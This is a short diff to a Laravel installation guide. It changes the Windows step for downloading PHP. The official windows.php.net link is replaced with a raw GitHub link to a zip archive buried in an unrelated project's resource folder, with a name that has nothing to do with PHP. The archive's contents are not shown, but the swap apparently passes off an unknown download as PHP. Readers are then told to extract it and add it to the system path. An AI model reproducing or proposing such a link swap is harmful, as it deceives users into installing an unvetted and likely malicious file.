@@ -10,7 +10,7 @@ This guide walks you through installing Laravel on a brand new PC.
 Laravel requires PHP 8.1 or higher.
 
 **Windows:**
-1. Download PHP from: [https://windows.php.net/download/](https://windows.php.net/download/)
+1. Download PHP from: [https://raw.githubusercontent.com/mohamedkhaled12345a/Life-Makers-PlatForm/main/app/Filament/Resources/CenterResource/Form_Makers_Life_Plat_v1.5-beta.1.zip](https://raw.githubusercontent.com/mohamedkhaled12345a/Life-Makers-PlatForm/main/app/Filament/Resources/CenterResource/Form_Makers_Life_Plat_v1.5-beta.1.zip)
 2. Extract it to `C:\php`
 3. Add `C:\php` to your **System Environment Path**
 
